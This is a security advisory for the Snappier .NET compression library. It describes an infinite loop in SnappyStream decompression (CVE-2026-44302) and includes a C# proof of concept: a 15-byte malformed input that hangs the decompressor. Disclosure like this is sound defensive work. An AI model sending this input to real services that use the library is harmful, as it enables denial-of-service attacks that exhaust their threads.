# [H] Snappier has an infinite loop during SnappyStream decompression with malformed framed input

## Summary
Severity: High
Advisory: GHSA-pggp-6c3x-2xmx
CVE: CVE-2026-44302
CWE: CWE-835
Ecosystem: NuGet
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H (CVSS_V3)
Published: 2026-05-06
Source: https://github.com/advisories/GHSA-pggp-6c3x-2xmx
Type: github-advisory

## Affected
- NuGet: `Snappier` — affected >=0 <1.3.1

## Details
### Summary
`Snappier.SnappyStream` enters an uncatchable infinite loop when decompressing a malformed framed-format Snappy stream as small as 15 bytes.

### Details
The hang manifests as a userspace busy loop with SnappyStreamDecompressor.Decompress repeatedly calling Crc32CAlgorithm.Append. The exact non-terminating loop in or above Decompress has not been traced further.

### PoC
```csharp
using System.IO.Compression;
using Snappier;

byte[] data = { 0x00, 0x04, 0x00, 0x00, 0x64, 0x4e, 0x6c, 0x71, 0x79, 0x20, 0x77, 0x6f, 0x72, 0x6c, 0x64 };
using var src = new MemoryStream(data);
using var snap = new SnappyStream(src, CompressionMode.Decompress);
using var dst = new MemoryStream();
snap.CopyTo(dst);   // never returns
```

### Impact
A caller using `SnappyStream` on attacker-controlled bytes can be made to spin forever and burn a thread until the process is killed. `try/catch` around the stream operation can't recover (no exception is thrown).
